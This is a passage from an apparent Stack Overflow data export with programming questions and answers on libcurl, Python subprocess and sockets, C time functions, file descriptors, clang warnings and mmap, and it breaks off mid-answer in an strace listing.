 * Here's an article on how to setup a PUT handler for Apache:
 * http://www.apacheweek.com/features/put
 */ 

static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t retcode;
  curl_off_t nread;

  /* in real-world cases, this would probably get this data differently
     as this fread() stuff is exactly what the library already would do
     by default internally */ 
  retcode = fread(ptr, size, nmemb, stream);

  nread = (curl_off_t)retcode;

  fprintf(stderr, ""*** We read %"" CURL_FORMAT_CURL_OFF_T
          "" bytes from file\n"", nread);

  return retcode;
}

int main(int argc, char **argv)
{
  CURL *curl;
  CURLcode res;
  FILE * hd_src ;
  struct stat file_info;

  char *file;
  char *url;

  if(argc &lt; 3)
    return 1;

  file= argv[1];
  url = argv[2];

  /* get the file size of the local file */ 
  stat(file, &amp;file_info);

  /* get a FILE * of the same file, could also be made with
     fdopen() from the previous descriptor, but hey this is just
     an example! */ 
  hd_src = fopen(file, ""rb"");

  /* In windows, this will init the winsock stuff */ 
  curl_global_init(CURL_GLOBAL_ALL);

  /* get a curl handle */ 
  curl = curl_easy_init();
  if(curl) {
    /* we want to use our own read function */ 
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);

    /* enable uploading */ 
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

    /* HTTP PUT please */ 
    curl_easy_setopt(curl, CURLOPT_PUT, 1L);

    /* specify target URL, and note that this URL should include a file
       name, not only a directory */ 
    curl_easy_setopt(curl, CURLOPT_URL, url);

    /* now specify which file to upload */ 
    curl_easy_setopt(curl, CURLOPT_READDATA, hd_src);

    /* provide the size of the upload, we specicially typecast the value
       to curl_off_t since we must be sure to use the correct data size */ 
    curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,
                     (curl_off_t)file_info.st_size);

    /* Now run off and do what you've been told! */ 
    res = curl_easy_perform(curl);
    /* Check for errors */ 
    if(res != CURLE_OK)
      fprintf(stderr, ""curl_easy_perform() failed: %s\n"",
              curl_easy_strerror(res));

    /* always cleanup */ 
    curl_easy_cleanup(curl);
  }
  fclose(hd_src); /* close the local file */ 

  curl_global_cleanup();
  return 0;
}
</code></pre>
"
"<p>Hey there I am writing a script for my computer architecture class for benchmarking. I do not know what is wrong with the code. I am new in python and also writing scripts.</p>

<p>THnks</p>

<pre><code>#!/usr/bin/python2
# Lab 4 script

import subprocess
subprocess.call(""cd adpcm"")
subprocess.call(""gcc -O0 -o adpcm-O0 adpcm.c"")
subprocess.call(""time ./adpcm-O0; 2&gt;&gt;out"")
subprocess.call(""time ./adpcm-O0; 2&gt;&gt;out"")
subprocess.call(""time ./adpcm-O0; 2&gt;&gt;out"")
subprocess.call(""time ./adpcm-O0; 2&gt;&gt;out"")
subprocess.call(""time ./adpcm-O0; 2&gt;&gt;out"")
subprocess.call(""rpistat ./adpcm-O0"")
</code></pre>
","9530","","<p>When you run <code>cd</code> in a subprocess, it only changes the other process's working directory—it does not have any effect on your current process's working directory.  You need to change your <em>own</em> working directory in order for that to have an effect on other subprocesses, e.g. using <a href=""https://docs.python.org/2/library/os.html#os.chdir"" rel=""nofollow""><code>os.chdir()</code></a>:</p>

<pre><code>os.chdir(""adpcm"")
subprocess.call(...)
...
</code></pre>

<p>If you are running commands which require assistance from the shell (such as file redirections with the <code>&gt;&gt;</code> operator), then you also need to make sure to pass the <code>shell=True</code> keyword argument to <a href=""https://docs.python.org/2/library/subprocess.html#subprocess.call"" rel=""nofollow""><code>subprocess.call()</code></a>:</p>

<pre><code>subprocess.call(..., shell=True)
</code></pre>
"
"<p>For example, I want to count how many seconds I have lived on earth. 
With gettimeofday()/time(), I can get the seconds count since Epoch, what else I want is the diff from  Epoch to my birthday, so my question is is there function like:</p>

<pre><code>time_t gettimeof_specified_day(my_birthday);
</code></pre>

<p>It return the seconds from Epoch to my birthday, then I can use difftime(now, birthday) to get what I want.</p>
","9530","","<p>You can use the <a href=""http://linux.die.net/man/3/mktime"" rel=""nofollow""><code>mktime(3)</code></a> function to convert any particular calendar date and time (expressed as a <code>struct tm</code> instance) into a <code>time_t</code> value:</p>

<pre><code>// Convert April 14, 1980 00:00:00 (local time, based on your computer's
// current time zone) into a time_t
struct tm my_birthday;
memset(&amp;my_birthday, 0, sizeof(my_birthday));
my_birthday.tm_year = 80;  // Number of years since 1900
my_birthday.tm_mon = 3;    // Month from 0-11
my_birthday.tm_mday = 14;  // Day of month from 1-31
time_t t = mktime(&amp;my_birthday);
</code></pre>
"
"<p>I developed an application that use libcurl as a http client.</p>

<p>I tried to conncet to a HTTP server, the server return http redirect to another address, but the libcurl do nothing after receiving the http redirect.</p>

<p>What I m missing?</p>

<p>my code:</p>

<pre><code>curl_easy_setopt(curl, CURLOPT_URL, url);
curl_easy_setopt(curl, CURLOPT_USERNAME, userid);
curl_easy_setopt(curl, CURLOPT_PASSWORD, passwd);
curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC|CURLAUTH_DIGEST);
curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);
curl_easy_setopt(curl, CURLOPT_TIMEOUT, HTTP_TIMEOUT);
curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, HTTP_TIMEOUT);
</code></pre>

<p>here after the traffic log:</p>

<pre><code>GET /openacs/ HTTP/1.1

Host: 192.168.1.110:8080

User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Connection: keep-alive



HTTP/1.1 301 Moved Permanently

Location: http://192.168.1.133:8080/openacs/acs

Date: Thu, 09 Feb 2012 15:33:15 GMT

Server: Apache/2.2.17 (Ubuntu)

Content-Length: 0

Content-Type: text/html; charset=iso-8859-1
</code></pre>
","9530","","<p>You also need to set the <a href=""http://curl.haxx.se/libcurl/c/curl_easy_setopt.html#CURLOPTFOLLOWLOCATION"" rel=""nofollow""><code>CURLOPT_FOLLOWLOCATION</code></a> flag to tell curl to automatically follow redirects:</p>

<pre><code>curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
</code></pre>
"
"<p>I want to write something to the stdin of a process <em>replacing</em> my current Python process. Is there an easy way to do this? I was thinking along the lines of</p>

<pre><code>import sys, os

r, w = os.pipe()
os.write(w, 'yo')
os.dup2(r, sys.stdin.fileno())
os.execvp('cat', [''])
</code></pre>

<p>but when I execute this in OS X, cat hangs, though 'yo' does get displayed. Why?</p>
","9530","","<p>You <code>os.fork()</code> the process before <code>execvp()</code>-ing the child process; the parent then writes to the pipe while the child reads from it.  The parent must also <code>close()</code> the read end of the pipe after <code>fork()</code>, and the child must <code>dup2()</code> the read end onto <code>stdin</code> and then close both of the original pipe handles before <code>execvp()</code>.  It's pretty standard Unix pipe stuff.</p>

<p>For example:</p>

<pre><code>r, w = os.pipe()
if os.fork() == 0:
    # Child process
    os.dup2(r, sys.stdin.fileno())
    os.close(r)
    os.close(w)
    os.execvp(...)
else:
    # Parent process
    os.close(r)
    os.write(w, 'yo')
    ...
    os.close(w)  # When done writing
    os.wait()
</code></pre>
"
"<p>I am trying to compare the current time to the date modified time of a file and am experiencing a strange issue. I have a struct tm * which holds the time the file was modified, but this is changed to the current date after I call time(NULL). </p>

<p>My code:</p>

<pre><code>  printf(""month: %d\n"", tmst-&gt;tm_mon);
  time_t curTime = time(NULL);
  printf(""month: %d\n"", tmst-&gt;tm_mon);
  struct tm * curSt = localtime ( &amp;curTime );
  printf(""month: %d\n"", tmst-&gt;tm_mon);
</code></pre>

<p>..where <code>st</code> is a <code>struct stat</code> for the file. Output is:</p>

<pre><code>month: 11
month: 5
</code></pre>

<p>Why is this? What should I be doing differently?</p>
","9530","","<p>As documented in the <a href=""http://linux.die.net/man/3/localtime"" rel=""nofollow""><code>localtime(3)</code></a> manual page:</p>

<blockquote>
  <p>The return value points to a statically allocated struct which might be overwritten by subsequent calls to any of the date and time functions.</p>
</blockquote>

<p>You need to copy the value out if you don't want it to be modified out from under you, e.g.:</p>

<pre><code>// Dereference and copy the result:
struct tm tmst = *localtime ( &amp;st.st_mtime );
</code></pre>

<p>You can also use the reentrant variant <code>localtime_r</code> to copy the result into a parameter passed into it, but note that this function is not portable.</p>
"
"<p>Doing a python socket tutorial, entire codebase is as follows</p>

<pre><code>import socket as so

s = so.socket()

host = so.gethostname()
port = 12345
s.bind((host, port))

s.listen(5)
while True:
    c, addr = s.accept()
    print 'Got connection from', addr
    c.send('Thank you for connecting')
    c.close()
</code></pre>

<p>and error message:</p>

<pre><code>Traceback (most recent call last):
  File ""server.py"", line 13, in &lt;module&gt;
    s.bind((host, port))
  File ""/Users/solid*name*/anaconda/lib/python2.7/socket.py"", line 224, in meth
    return getattr(self._sock,name)(*args)
socket.gaierror: [Errno 8] nodename nor servname provided, or not known
</code></pre>

<p>Printing hostname gives me </p>

<pre><code>super*name*
</code></pre>

<p>Which is, in fact, my computer's hostname, although I feel like there should be '.local' at the end of it. In fact, s.bind() works if there is a .local at the end. Why isn't it there?</p>

<p>Mac OS X 10.7.5, Python 2.7.6 :: Anaconda 2.0.0 (x86_64)</p>
","9530","","<p>From the <a href=""https://docs.python.org/2/library/socket.html"" rel=""nofollow""><code>socket</code> module documentation</a>:</p>

<blockquote>
  <p>If you use a hostname in the <em>host</em> portion of IPv4/v6 socket address, the program may show a nondeterministic behavior, as Python uses the first address returned from the DNS resolution. The socket address will be resolved differently into an actual IPv4/v6 address, depending on the results from DNS resolution and/or the host configuration. For deterministic behavior use a numeric address in <em>host</em> portion.</p>
</blockquote>

<p>The typical way of binding sockets is to just bind to <em>all</em> network interfaces, using either of the equivalent host specifications <code>''</code> or <code>'0.0.0.0'</code> (for IPv4).  This is equivalent to the C constant <code>INADDR_ANY</code>:</p>

<pre><code>s.bind(('', port))
</code></pre>

<p>And then you don't have to worry about hostnames or current network interface addresses etc.  Only in the more unusual case of wanting to bind to a particular network interface (e.g. on a host with multiple NICs) should you ever need to specify the address in the call to <code>bind()</code>; in that case, you need to figure out the numeric IP address of the network interface you want and pass that.</p>
"
"<p>Consider the following code:</p>

<pre><code>//#import &lt;Foundation/Foundation.h&gt;

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        NSLog(@""Hello World!"");
    }
    return 0;
}
</code></pre>

<p>I cannot understand why it could be built and run? w/out Foundation header!</p>

<p><strong>For me it is still strange that C compiler COMPILES this code w/out header i.e. w/out DECLARATIONS. It's strange that compiler matches my function somehow to already compiled code (Foundation) and succeeds. Are there some links to C standard that will explain me how compiler resolves token that recognized as a function and was never previously declared?</strong></p>

<p>Please, explain!!</p>

<p>UPDATE: These if not due to pre-compiled headers</p>

<p>Thank you! But NO. I tested it the following way - just typed Hello World code in vi editor and saved it as main.m file. Than compiled it with clang from Terminal. And e-thing went Okay with 1 warning only:</p>

<pre><code>main.m:8:9: warning: implicitly declaring library function 'NSLog' with type 'void (id, ...)' NSLog(@""Hello World!"");
^ main.m:8:9: note: please include the header &lt;Foundation/NSObjCRuntime.h&gt; or explicitly provide a declaration for 'NSLog'
1 warning generated.
</code></pre>

<p>UPDATE: Just attaching all the images step-by-step:
<img src=""http://i.stack.imgur.com/wUk98.png"" alt=""The only file in directory main.m"">
<img src=""http://i.stack.imgur.com/ox9eT.png"" alt=""Contents of main.m - VIM"">
<img src=""http://i.stack.imgur.com/eH8qj.png"" alt=""Compiling ... Compiled!"">
<img src=""http://i.stack.imgur.com/KHhgW.png"" alt=""Test run of the application built""></p>
","9530","","<p>This doesn't appear to be documented anywhere that I can find, but clearly the <code>-fobjc-arc</code> command line flag is causing the linker to automatically link in Foundation.framework.</p>

<p>Without <code>-fobjc-arc</code>:</p>

<pre><code>$ clang main.m
main.m:3:5: warning: implicitly declaring library function 'NSLog' with type
      'void (id, ...)'
    NSLog(@""Hello World!"");
    ^
main.m:3:5: note: please include the header &lt;Foundation/NSObjCRuntime.h&gt; or
      explicitly provide a declaration for 'NSLog'
1 warning generated.
Undefined symbols for architecture x86_64:
  ""_NSLog"", referenced from:
      _main in main-db9728.o
  ""___CFConstantStringClassReference"", referenced from:
      CFString in main-db9728.o
  ""_objc_autoreleasePoolPop"", referenced from:
      _main in main-db9728.o
  ""_objc_autoreleasePoolPush"", referenced from:
      _main in main-db9728.o
ld: symbol(s) not found for architecture x86_64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
</code></pre>

<p>With <code>-fobjc-arc</code>:</p>

<pre><code>$ clang main.m -fobjc-arc
main.m:3:5: warning: implicitly declaring library function 'NSLog' with type
      'void (id, ...)'
    NSLog(@""Hello World!"");
    ^
main.m:3:5: note: please include the header &lt;Foundation/NSObjCRuntime.h&gt; or
      explicitly provide a declaration for 'NSLog'
1 warning generated.
</code></pre>

<p><a href=""http://stackoverflow.com/a/24210920/9530"">Carol Norum explained</a> why it compiles fine without including the proper header file.  Nevertheless, this is bad practice, and you should always include the proper header files you need and explicitly link against the frameworks you need.  It may work <em>this</em> time, but it may hide some insidious bugs and fail in spectacular ways with other code.</p>
"
"<p><strong>Background Info</strong></p>

<p>I'm developing a network-enabled embedded device that is intended to communicate with a server. Because this server will be running linux (but I require Windows tools for development), I'm running a VM with Ubuntu Server 14.04 for dev purposes.</p>

<p>The embedded aspect isn't important for this question, as I'm stripping back to the simplest test setup (just have host connect to server on VM to see a TCP connection get established) for troubleshooting.</p>

<p><strong>Network Setup</strong></p>

<ul>
<li><p>D-Link DIR-615 running DD-WRT [v24-sp2 (03/25/13) std (SVN revision 21061)], static IPs assigned to host and VM by MAC filter, DNS feature enabled</p></li>
<li><p>Development Machine (192.168.5.117, dev.test.lan)</p></li>
<li><p>Ubuntu VM (192.168.5.118, vm.test.lan) - using a bridged connection (NAT doesn't work as the client will initiate connection to VM)</p></li>
<li><p>Router isn't connected to any sort of WAN, only wired connections, Wi-fi is disabled</p></li>
</ul>

<p><strong>Sanity Checks Performed</strong></p>

<ul>
<li><p>ping host from VM succeeds (using IP or dns name)</p></li>
<li><p>ping VM from host succeeds (using IP or dns name)</p></li>
<li><p>nc between host &lt;-> VM (can listen/connect from either side) [listening on port 9050]</p></li>
<li><p>within VM, can connect via nc to server application running on VM, a connection is successfully established [to port 9050]</p></li>
<li><p>Windows firewall opened for incoming/outgoing TCP connections on port 9050</p></li>
</ul>

<p><strong>Problem Analysis</strong></p>

<p>Using wireshark, I'm able to see TCP connections working succesfully when performing the nc sanity test (host &lt;-> VM).</p>

<p>When I run the server (written in python, using asyncio) on the VM, and try to connect via nc from the host, the server doesn't see any connection come in (but we know that connecting from nc to the server works, as that was tested inside the VM successfully). </p>

<p>From wireshark I see the host sending a SYN to the VM, after which the VM responds with [RST, ACK]. The host retries transmission twice before giving up.</p>

<p><strong>Questions</strong></p>

<ul>
<li><p>Is a bridged connection the appropriate setting to use for the VM?</p></li>
<li><p>What is the best way to find out where the RST is coming from? (is it the router, the VMs TCP/IP stack, or is some part of Python causing it?)</p></li>
</ul>

<hr>

<p><strong>Update:</strong>
Tried <code>nc 192.168.5.118 9050</code> within the VM and observed the same refused connection behaviour as if I had tried from host. Based on what Adam has said, it looks like we're getting closer. Will try Adam's suggestion as well and post an update.</p>
","9530","","<p>The RST packet is being sent by the OS to indicate that the port is closed—no process is bound to it and listening.  As a result, the client trying to connect will very quickly fail with <code>ECONNREFUSED</code> (connection refused).  This is perfectly normal behavior.</p>

<p>How exactly are you binding to the port in your Python server process?  Are you binding to the correct network interface?  If you accidentally bound to only the loopback device (<code>localhost</code> or <code>127.0.0.1</code>), then you'll see exactly what you're describing: local connections from the machine to itself will succeed just fine, but connections from external hosts will fail.</p>

<p>In Python, you typically use either <code>''</code> or <code>'0.0.0.0'</code> as the address portion to indicate that you want to bind to all network interfaces; this is equivalent to the C constant <code>INADDR_ANY</code>:</p>

<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', port))
</code></pre>
"
"<p>Write a program that opens an existing file for writing with the O_APPEND flag, and
then seeks to the beginning of the file before writing some data. Where does the
data appear in the file? Why?</p>

<p>this is my code :</p>

<pre><code>main() {
    int fd = open(""test.txt"", O_WRONLY | O_APPEND);

    lseek(fd, 0, SEEK_SET);
    write(fd, ""abc"", 3);
    close(fd);
}
</code></pre>

<p>and have tried it and found that data has been write in the end of the file, i want to understand why?? because i indicated the O_APPEND flag no that too simple i think</p>
","9530","","<p>When you open a file with <code>O_APPEND</code>, all data gets written to the end, regardless of whatever the current file pointer is from the latest call to <code>lseek(2)</code> or the latest read/write operation.  From the <a href=""http://linux.die.net/man/2/open"" rel=""nofollow""><code>open(2)</code> documentation</a>:</p>

<blockquote>
  <p><code>O_APPEND</code><br>
  The file is opened in append mode. Before each <code>write(2)</code>, the file offset is positioned at the end of the file, as if with <code>lseek(2)</code>.</p>
</blockquote>

<p>If you want to write data the end of the file and then the beginning of it later, open it up without <code>O_APPEND</code>, use <a href=""http://linux.die.net/man/2/fstat"" rel=""nofollow""><code>fstat(2)</code></a> to get the file size (<code>st_size</code> member within <code>struct stat</code>), and then seek to that offset to write the end.</p>
"
"<p>I'm doing some experiment about extern keywork and currently working on Fedora 19 and g++.
Im trying to compile multiple c++ files and execute the program. Here it compiled successfully. but when try to run it shows <code>Permission denied</code> error. I change to permission using <code>chmod</code> to 777. but still result is same. then I try to compile and run a simple Hello World program and That works fine. Whats wrong with my program?</p>

<p>test1.h</p>

<pre><code>int a=0;
</code></pre>

<p>test2.h</p>

<pre><code>#include &lt;iostream&gt;
using namespace std;

extern int a;    
void foo()
{
 cout &lt;&lt; ""This is a test string "" &lt;&lt; endl;
 cout &lt;&lt; a &lt;&lt; endl;
}

int main()
{
 foo();
}
</code></pre>

<p>Here is how I compiled and the execute result of  theTerminal</p>

<pre><code>[root@localhost cpp]# g++ test1.h test2.h -o test.o
[root@localhost cpp]# ./test.o
bash: ./test.o: Permission denied
[root@localhost cpp]# 
</code></pre>
","9530","","<p>You have several problems.  If you use the <a href=""http://linux.die.net/man/1/file""><code>file(1)</code></a> utility to inspect the output file, you'll realize why it can't be executed:</p>

<pre><code>$ file test.o
test.o: GCC precompiled header (version 013) for C++
</code></pre>

<p>Precompiled header files are not valid executable files—they're not valid ELF files and they're not script files with a shbang line, they're just data files that the compiler knows how to read.</p>

<p>Why are you getting a precompiled header file?  Because you're asking g++ to compile header files (<code>.h</code> files).  It's really ridiculous to give your C++ source files <code>.h</code> extensions, because they're not header files, they're source files.  Give them the proper <code>.cc</code> or <code>.cpp</code> extensions, and g++ will compile them correctly to an executable.</p>

<p>Secondly, why are you giving the output file the name <code>test.o</code>?  <code>.o</code> is used for object files (compiled versions of singular source files, not complete executables), but you're asking g++ to compile a full executable.  If you only want to compile and not also link, then pass the <code>-c</code> flag, and then manually link the object files together.  Don't name your executables with <code>.o</code>.  <code>test</code> would be the more proper name for an executable compiled from a source file named <code>test.cc</code>, but I'd caution against that and recommend using something else, because <code>test</code> is also the name of a <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Bourne-Shell-Builtins"">shell builtin function</a>.</p>
"
"<p>For some other reasons, the c++ shared library I used outputs some texts to standard output. In python, I want to capture the output and <strong>save to a variable</strong>. There are many similar questions about redirect the stdout, but not work in my code. </p>

<p>Example: <a href=""http://stackoverflow.com/questions/4178614/suppressing-output-of-module-calling-outside-library"">Suppressing output of module calling outside library</a></p>

<pre><code>1 import sys
2 import cStringIO
3 save_stdout = sys.stdout
4 sys.stdout = cStringIO.StringIO()
5 func()
6 sys.stdout = save_stdout
</code></pre>

<p>In line 5, <strong>func()</strong> will call the shared library, the texts generated by shared library still output to console! If change <strong>func() to print ""hello""</strong>, it works!</p>

<p>My problem is:</p>

<ol>
<li>how to capture  stdout of the c++ shared library <strong>to a variable</strong>?</li>
<li>Why using StringIO, can't capture the outputs from shared library?</li>
</ol>
","9530","","<p>Python's <a href=""https://docs.python.org/2/library/sys.html#sys.stdout"" rel=""nofollow""><code>sys.stdout</code></a> object is simply a Python wrapper on top of the usual stdout file descriptor—changing it only affects the Python process, not the underlying file descriptor.  Any non-Python code, whether it be another executable which was <code>exec</code>'ed or a C shared library which was loaded, won't understand that and will continue using the ordinary file descriptors for I/O.</p>

<p>So, in order for the shared library to output to a different location, you need to change the underlying file descriptor by opening a new file descriptor and then replacing stdout using <a href=""https://docs.python.org/2/library/os.html#os.dup2"" rel=""nofollow""><code>os.dup2()</code></a>.  You could use a temporary file for the output, but it's a better idea to use a pipe created with <a href=""https://docs.python.org/2/library/os.html#os.pipe"" rel=""nofollow""><code>os.pipe()</code></a>.  However, this has the danger for deadlock, if nothing is reading the pipe, so in order to prevent that we can use another thread to drain the pipe.</p>

<p>Below is a full working example which does not use temporary files and which is not susceptible to deadlock (tested on Mac OS X).</p>

<p>C shared library code:</p>

<pre><code>// test.c
#include &lt;stdio.h&gt;

void hello(void)
{
  printf(""Hello, world!\n"");
}
</code></pre>

<p>Compiled as:</p>

<pre><code>$ clang test.c -shared -fPIC -o libtest.dylib
</code></pre>

<p>Python driver:</p>

<pre><code>import ctypes
import os
import sys
import threading

print 'Start'

liba = ctypes.cdll.LoadLibrary('libtest.dylib')

# Create pipe and dup2() the write end of it on top of stdout, saving a copy
# of the old stdout
stdout_fileno = sys.stdout.fileno()
stdout_save = os.dup(stdout_fileno)
stdout_pipe = os.pipe()
os.dup2(stdout_pipe[1], stdout_fileno)
os.close(stdout_pipe[1])

captured_stdout = ''
def drain_pipe():
    global captured_stdout
    while True:
        data = os.read(stdout_pipe[0], 1024)
        if not data:
            break
        captured_stdout += data

t = threading.Thread(target=drain_pipe)
t.start()

liba.hello()  # Call into the shared library

# Close the write end of the pipe to unblock the reader thread and trigger it
# to exit
os.close(stdout_fileno)
t.join()

# Clean up the pipe and restore the original stdout
os.close(stdout_pipe[0])
os.dup2(stdout_save, stdout_fileno)
os.close(stdout_save)

print 'Captured stdout:\n%s' % captured_stdout
</code></pre>
"
"<p>Given that:</p>

<pre><code>char *message = ""Hello, World"";
char *format  = ""x=%i\n"";
int x = 10;
</code></pre>

<p>Why is <code>printf (message);</code> invalid (i.e. rejected by compiler for being potentially insecure) and <code>printf (format, x);</code> isn't?</p>

<p>Is <code>format</code> treated as a string literal in this case and <code>message</code> as a format string? If so, why?</p>

<p><br></p>

<h2>Update</h2>

<p><hr>
I know why <code>printf (message);</code> is rejected. My question is, why is <code>printf (format, x);</code> not rejected too.</p>

<p>I'm using clang. The error message for <code>printf (message);</code> is <code>format string is not string literal (potentially insecure)</code>.</p>

<p>It compiles fine under gcc. So it does appear to be compiler specific and to do with how clang sets it warnings.</p>
","9530","","<p>You can get a warning in both cases by enabling the <code>-Wformat-nonliteral</code> option, which is not included in either <code>-Wall</code> or <code>-Wextra</code> (but it <em>is</em> in <code>-Weverything</code>).</p>

<p>For whatever reason, this seems like an intentional design decision to emit a security warning only when the non-literal <code>printf</code> statement takes no additional arguments.  The source code which emits this warning can be found in <a href=""https://github.com/llvm-mirror/clang/blob/master/lib/Sema/SemaChecking.cpp#L2258"" rel=""nofollow""><code>lib/Sema/SemaChecking.cpp</code></a>:</p>

<pre><code>  // If there are no arguments specified, warn with -Wformat-security, otherwise
  // warn only with -Wformat-nonliteral.
  if (Args.size() == firstDataArg)
    Diag(Args[format_idx]-&gt;getLocStart(),
         diag::warn_format_nonliteral_noargs)
      &lt;&lt; OrigFormatExpr-&gt;getSourceRange();
  else
    Diag(Args[format_idx]-&gt;getLocStart(),
         diag::warn_format_nonliteral)
           &lt;&lt; OrigFormatExpr-&gt;getSourceRange();
</code></pre>

<p>I'd guess that this is for compatibility with existing legacy code, but that's pure speculation.</p>
"
"<p>Somehow, this works:</p>

<pre><code>def in_range(min, test, max):
    return min &lt;= test &lt;= max

print in_range(0, 5, 10)  # True
print in_range(0, 15, 10)  # False
</code></pre>

<p>However, I can't quite figure out the order of operations here. Let's test the <code>False</code> case:</p>

<pre><code>print 0 &lt;= 15 &lt;= 10  # False
print (0 &lt;= 15) &lt;= 10  # True
print 0 &lt;= (15 &lt;= 10)  # True
</code></pre>

<p>Clearly, this isn't resolving to a simple order of operations issue. Is the interval comparison a special operator, or is something else going on?</p>
","9530","","<p>As specified in the <a href=""https://docs.python.org/2/reference/expressions.html#not-in"" rel=""nofollow"">Python documentation</a>:</p>

<blockquote>
  <p>Comparisons can be chained arbitrarily, e.g., <code>x &lt; y &lt;= z</code> is equivalent to <code>x &lt; y and y &lt;= z</code>, except that <code>y</code> is evaluated only once (but in both cases <code>z</code> is not evaluated at all when <code>x &lt; y</code> is found to be false).</p>
  
  <p>Formally, if <em>a</em>, <em>b</em>, <em>c</em>, ..., <em>y</em>, <em>z</em> are expressions and <em>op1</em>, <em>op2</em>, ..., <em>opN</em> are comparison operators, then <code>a op1 b op2 c ... y opN z</code> is equivalent to <code>a op1 b and b op2 c and ... y opN z</code>, except that each expression is evaluated at most once.</p>
</blockquote>
"
"<p>I have a problem where my client always seems to connect to localhost(127.0.0.1) even though I'm passing it another address. Consider:
$ ./client 139.130.4.5 80</p>

<pre><code>    if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1 ){
       error(""Opening Socket"");
    }
    if ( (server = gethostbyname(argv[1])) == NULL) {
        fprintf(stderr,""ERROR, no such host\n"");
        close(sockfd);
        exit(0);
    }
    memset((char *) &amp;serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    memcpy((char *)server-&gt;h_addr, (char *)&amp;serv_addr.sin_addr.s_addr, server-&gt;h_length);
    serv_addr.sin_port = htons(portnum);

    if (connect(sockfd,(struct sockaddr *) &amp;serv_addr,sizeof(serv_addr)) == -1){
        error(""Connect"", sockfd);
    }
</code></pre>

<p>This always results in a connection to localhost, even though <code>argv[1]</code> is 139.130.4.5 and <code>portnum</code> is 80</p>
","9530","","<p>You have the arguments to <a href=""http://linux.die.net/man/3/memcpy"" rel=""nofollow""><code>memcpy(3)</code></a> backwards.  It should be <code>memcpy(dest, source, len)</code>:</p>

<pre><code>memcpy(&amp;serv_addr.sin_addr.s_addr, server-&gt;h_addr, server-&gt;h_length);
</code></pre>

<p>Also, you shouldn't be casting to <code>char *</code> in the calls to <code>memcpy()</code> and <code>memset()</code>, since they take <code>void*</code> as arguments, and any pointer type can be implicitly converted to <code>void*</code> without a cast.  The cast just clutters up the code and could hide a potential bug (like trying to pass in a non-pointer type).</p>
"
"<p>I saw the following code:</p>

<pre><code>[UIView animateWithDuration:5.0 animations:^ {
    iv.alpha = 1.0;//iv is a UIImageView
}];
</code></pre>

<p>Supposedly <code>^</code> defines a function block or something.  Is this similar to a delegate?  Is this part of C/C++ or Objective-C?  I cannot option+CLICK this symbol to go to it in the documentation.</p>
","9530","","<p>The caret symbol creates a <a href=""https://developer.apple.com/library/ios/documentation/cocoa/Conceptual/Blocks/Articles/00_Introduction.html"" rel=""nofollow"">block</a>, which is similar to a delegate.  It's a type of <a href=""https://en.wikipedia.org/wiki/Closure_%28computer_programming%29"" rel=""nofollow"">closure</a>—a function defined inline that also has access to variables in the parent scope, which can often be used to greatly simplify certain types of delegate-/callback-oriented code.</p>
"
"<p>We are getting segfaults with this code:</p>

<pre><code>#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;stdio.h&gt;

#define CHUNKSIZE 4096

int main(int argc, char **argv) {
    printf(""Hallo!\n""); // does not segfault without this line

    void* first_chunk = mmap(NULL, CHUNKSIZE, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
    void* next_chunk_addr = (void*) ((char*)first_chunk + CHUNKSIZE);
    mmap(next_chunk_addr, CHUNKSIZE, PROT_NONE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, 0, 0);

    printf(""Bumm!\n""); // segfaults
}
</code></pre>

<p>Even if the address of the second mmap-call is invalid, I believe I should get a MAP_FAILED instead of a broken stack.</p>

<p>GDB gives me this:</p>

<pre><code>Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7a94104 in _IO_file_xsputn () from /lib/x86_64-linux-gnu/libc.so.6
(gdb) bt
#0  0x00007ffff7a94104 in _IO_file_xsputn () from /lib/x86_64-linux-gnu/libc.so.6
#1  0x00007ffff7a8ad79 in puts () from /lib/x86_64-linux-gnu/libc.so.6
#2  0x0000000000400591 in main (argc=1, argv=0x7fffffffdf28) at test.cpp:14
(gdb) x/i $rip
=&gt; 0x7ffff7a94104 &lt;_IO_file_xsputn+324&gt;:    mov    %dl,(%r8,%rax,1)
</code></pre>

<p>Why is he trying to read from 0x7ffff7ff8000, which has nothing to do with what he is supposed to print?</p>

<p>On another machine, we got this stack trace with related code:</p>

<pre><code>Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7b0985a in mmap64 () at ../sysdeps/unix/syscall-template.S:81
81  ../sysdeps/unix/syscall-template.S: No such file or directory.
</code></pre>

<p>Can this have something to do with the kernel side?</p>

<p>This happens on three different Linux systems with gcc and clang. Nothing happens under OS X.</p>
","9530","","<p>The kernel is behaving exactly as expected.  Take note of this sentence from the <a href=""http://linux.die.net/man/2/mmap"" rel=""nofollow""><code>mmap(2)</code> documentation</a> on <code>MAP_FIXED</code>:</p>

<blockquote>
  <p>If the memory region specified by <code>addr</code> and <code>len</code> overlaps pages of any existing mapping(s), then the overlapped part of the existing mapping(s) will be discarded.</p>
</blockquote>

<p>If you do an <a href=""http://linux.die.net/man/1/strace"" rel=""nofollow""><code>strace(1)</code></a> of the program, you'll see that exactly that is happening:</p>

<pre><code>...
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0710755000
write(1, ""Hallo!\n"", 7)                 = 7
